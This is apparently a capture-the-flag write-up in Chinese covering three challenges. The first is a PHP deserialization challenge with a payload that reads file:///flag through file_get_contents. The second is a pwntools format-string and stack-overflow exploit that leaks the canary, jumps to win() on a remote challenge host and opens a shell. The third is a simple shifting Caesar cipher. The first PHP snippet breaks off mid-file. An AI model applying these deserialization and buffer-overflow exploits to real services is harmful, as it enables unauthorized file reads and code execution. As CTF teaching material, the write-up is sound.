<?php
require_once "./config.php";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $s = $_POST["shark"] ?? '喵喵喵?';

index.php中用post方法传入shark,赋给$s,然后将blueshark:之后的字符串赋给$ss，再将$ss反序列化后赋给$o,将$ss存入数据库，并在页面上显示最近十条记录，包括编号（id）,这里unserialize其实没用上，要在api.php中用。

<?php
require_once "./config.php";
require_once "./classes.php";

$id = $_GET["id"] ?? '喵喵喵?';

$s = $db->prepare("SELECT content FROM notes WHERE id = ?");
$s->execute([$id]);
$row = $s->fetch(PDO::FETCH_ASSOC);

if (! $row) {
    die("喵喵喵?");
}

$cfg = unserialize($row["content"]);

if ($cfg instanceof ShitMountant) {
    $r = $cfg->fetch();
    echo "ok!" . "<br>";
    echo nl2br(htmlspecialchars($r));
}
else {
    echo "喵喵喵?";
}
?>

api.php接收get参数id赋给$id,从数据库中读取id为$id的记录，并创建关联数组使$row[“content”]为该记录，并进行反序列化，结果赋给$cfg,如果$cfg是ShitMountant的实例就调用其fetch()方法，并显示调用结果。

class ShitMountant {
    public $url;
    public $logger;

    public function __construct($url) {
        $this->url = $url;
        $this->logger = new FileLogger();
    }

    public function fetch() {
        $c = file_get_contents($this->url);
        if ($this->logger) {
            $this->logger->write("fetched ==> " . $this->url);
        }
        return $c;
    }

    public function __destruct() {
        $this->fetch();
    }
}

classes.php中ShitMountant类定义的fetch()方法中调用了file_get_contents()读取属性url的内容。

利用:

$o = new ShitMountant('');
$o->url = "file:///flag";  

echo serialize($o);

ez_fmt

开了canary，输入太长会触发，用先多个%p寻找canary（rbp-8），结果中看到第23个地址以00结尾，可能就是。根据偏移可以确定main的地址，从而计算出实际地址，然后用实际地址覆盖canary,跳转到win()函数，获得shell,要加一个ret调整栈对齐。

from pwn import *

context.log_level="debug"
context.arch="amd64"

io=remote("challenge.bluesharkinfo.com",20439)

libc=ELF("test1/isctf_ez_fmt/libc.so.6")
ld=ELF("test1/isctf_ez_fmt/ld-linux.so.2")

p1=b"%23$p.%31$p"
io.sendlineafter(b'1st input:',p1)

addrs=io.recvline().decode().split(".")

cana_addr=int(addrs[0],16)
main_addr=int(addrs[1],16)

main_offset = 0x12Fa   
win_offset = 0x11e9   

elf_base = main_addr - main_offset
win_addr = elf_base + win_offset

retgadget_addr = elf_base+0x101a

payload = b'A' * 136
payload += p64(cana_addr)
payload += b'B' * 8   

payload += p64(retgadget_addr)
payload += p64(win_addr)


io.sendlineafter(b'2nd input:',payload)
io.interactive()

def variant_caesar_encrypt(text):
    encrypted = ""
    shift = 2
    for char in text:
        if char.isalpha():
            if char.isupper():
                base = ord('A')
                new_char = chr((ord(char) - base + shift) % 26 + base)
            else:
                base = ord('a')
                new_char = chr((ord(char) - base + shift) % 26 + base)
            encrypted += new_char
            shift += 3
        else:
            encrypted += char
    return encrypted
